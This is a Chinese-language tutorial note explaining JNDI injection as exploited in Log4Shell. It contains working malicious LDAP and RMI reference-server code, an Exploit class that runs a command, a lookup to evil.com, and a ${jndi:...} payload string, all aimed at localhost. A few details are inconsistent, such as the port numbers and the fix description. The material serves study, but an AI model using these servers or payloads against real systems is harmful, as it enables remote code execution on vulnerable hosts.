# JNDI

是一种命名服务，可以做到通过**名字**找到**对象**，不用关心对象存在哪里LDAP/RMI/DNS。

其中有两种核心方法

**1、先去公布资源 --bind方法**

**2、然后别人可以用名字查找资源 --lookup方法**

log4j 即为在日志字符串里写 `lookup()` 的参数，导致可以去恶意服务器拉取对象。

## JNDI 远程加载对象的流程

可以分为 **5 个阶段**：

### 1.客户端调用lookup发起查询目标地址

```
// 攻击者
Context ctx = new InitialContext();
Object obj = ctx.lookup("ldap://evil.com:1389/Exploit");
```

这一步只是 发出 JNDI 请求，此时还没有 `Reference` 对象，也还没加载任何远程类。



### 2.目录服务返回 `Reference`

以 log4j PoC 的 `LDAPRefServer` （也可以是其他工具）为例，目录服务这边拦截搜索、自己构造条目：

```
protected void sendResult(..., Entry e) {
// 打印：redirecting to http://127.0.0.1:80/Exploit.class
  URL turl = new URL(this.codebase, this.codebase.getRef().replace('.',      '/').concat(".class"));
  ...
e.addAttribute("javaCodeBase", cbstring);      // http://127.0.0.1:80/
e.addAttribute("objectClass", "javaNamingReference");
e.addAttribute("javaFactory", this.codebase.getRef()); // Exploit
result.sendSearchEntry(e);
}
```

JNDI 客户端这边会把这条 LDAP 结果转换成一个 `javax.naming.Reference` 对象。
“加载 Reference” 就发生在这里——即 lookup() 从目录服务拿回一个 `Reference` 实例，而不是最终对象。这一阶段主要是 “把 LDAP 条目翻译成 Reference”，没有开始真正的类加载。



### 3.Reference 解析阶段

这是**判断返回内容类型**的关键阶段。远程服务器返回的响应有两种可能：

| **序列化对象** | 直接返回序列化的 Java 对象，客户端反序列化 | 高危                 |
| :------------- | :----------------------------------------- | :------------------- |
| **Reference**  | 返回一个对象引用，包含类名和下载地址       | **Log4j 利用的方式** |

A.直接绑定到对象，就会把对象本体序列化后发过来。如果lookup的对象客户端有能够在反序列化过程中自动执行的回调/钩子方法（或被框架自动触发的逻辑），并且对象图里还串着一组会调用危险操作的利用链*，那么客户端一反序列化就会触发“反序列化链”*，

当返回的是 Reference 时，客户端会创建 `javax.naming.Reference` 对象，其核心属性：

```
public class Reference {
    private String className;    // 要加载的类名，如 "Exploit"
    private String factory;       // 工厂类名（可选）
    private String classFactory;  // 工厂位置
    private List<RefAddr> addresses; // 包含 codebase URL
}
```

###  4.Reference 加载阶段

当客户端获取到 `Reference` 对象后，JNDI 会触发以下加载流程：

```
// 伪代码示意
if (response instanceof Reference) {
    Reference ref = (Reference) response;
    String className = ref.getClassName();
    String codebase = ref.getFactoryLocation();  // 如 "http://evil.com/"
    
    // 从远程 codebase 下载类
    ClassLoader loader = getContextClassLoader();
    Class<?> clazz = loader.loadClass(className);
    // 如果本地找不到，会从 codebase URL 下载，走 HTTP ClassLoader
    // 下载后执行静态代码块
}
```

**此阶段包括**：

1. 从 Reference 中提取 `className` 和 `codebase` URL

2. 根据 codebase 下载对应的 `.class` 文件

3. `ClassLoader` 加载该类，**静态代码块自动执行**

   

### 5.类加载 + 初始化

当 JNDI 决定要加载 `Exploit` 这个类时，会触发正常的 Java 类加载流程：

1. 找到或创建合适的 `ClassLoader`。
2. 通过 `defineClass` 把字节码变成 `Class<?>` 对象。
3. 类初始化：执行 `<clinit>`，也就是源码里的 `static { ... }`。

例 log4j PoC 里的：

public class Exploit {

​    static {

​        Runtime.getRuntime().exec("calc");

​    }

}

*Log4j 2.17.0 修复的核心就是**禁用了第 4 阶段中从远程 codebase 加载类的行为**：

```
// 修复后的 JNDI 实现
if (codebase != null && !isTrustedCodebase(codebase)) {
    // 拒绝加载远程类
    throw new ConfigurationException("Remote class loading disabled");
}
```

现在的 JNDI 实现中，`com.sun.jndi.rmi.object.trustURLCodebase` 和 `com.sun.jndi.ldap.object.trustURLCodebase` 默认值已从 `true` 改为 `false`。



ldapseriserver

启动后在 `0.0.0.0:7389` 开一个 LDAP 服务端口，接受

```
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    /**
     * class地址 用#Exploit代替Exploit.class
     * 使用本机 HTTP 服务（监听 80 端口）上的 Exploit.class。
     */
    private static final String EXPLOIT_CLASS_URL = "http://127.0.0.1:80/#Exploit";

    public static void main(String[] args) {
        int port = 7912;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));
            //拦截，由OperationInterceptor伪造返回
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Calc");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            // JNDI 收到 LDAP 响应时，会解析这些属性并构建 Reference 对象：
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}

```

### 客户端实际执行的伪代码

// JNDI 内部处理流程
if (entry.hasAttribute("objectClass", "javaNamingReference")) {
    Reference ref = new Reference(
        entry.getAttribute("javaClassName").getValue(),
        entry.getAttribute("javaFactory").getValue(),
        entry.getAttribute("javaCodeBase").getValue()
    );
    // 从 javaCodeBase 下载并加载 javaFactory 指定的类
    Class<?> clazz = loadClassFromURL(ref);
    // 实例化并执行静态代码块
    clazz.newInstance();
}

下面我们看rmi版本

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiRefServer {

    private static final String CODEBASE = "http://127.0.0.1:80/";
    private static final int RMI_PORT = 1099;
    private static final String BIND_NAME = "Exploit";

    public static void main(String[] args) throws RemoteException, NamingException {
        Reference ref = new Reference(BIND_NAME, BIND_NAME, CODEBASE);
        //直接指定BIND_NAME 
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        Registry registry = LocateRegistry.createRegistry(RMI_PORT);
        registry.rebind(BIND_NAME, wrapper);
        System.out.println("RMI Registry listening on 0.0.0.0:" + RMI_PORT);
        System.out.println("Bound Reference: class=" + BIND_NAME + " codebase=" + CODEBASE);
        System.out.println("Log4j payload example: ${jndi:rmi://127.0.0.1:" + RMI_PORT + "/" + BIND_NAME + "}");
    }
}

```

RMI 不需要拦截是因为 **RMI Registry 本身就是存储和返回对象的容器**，客户端请求时直接返回预先绑定的 ReferenceWrapper 对象，无需中间拦截伪造。
